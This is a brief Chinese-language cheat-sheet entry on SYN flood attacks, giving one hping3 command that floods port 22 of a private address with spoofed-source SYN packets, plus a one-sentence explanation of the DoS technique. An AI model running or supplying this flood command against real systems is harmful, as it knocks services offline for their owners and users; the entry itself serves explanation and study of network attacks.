    ### SYN 洪泛攻击受害者


    ```

    hping3 -S 192.168.1.1 -a 192.168.1.254 -p 22 --flood

    ```


    攻击者使用伪造的 IP 地址使用 TCP SYN 洪泛技术执行 DoS 攻击。


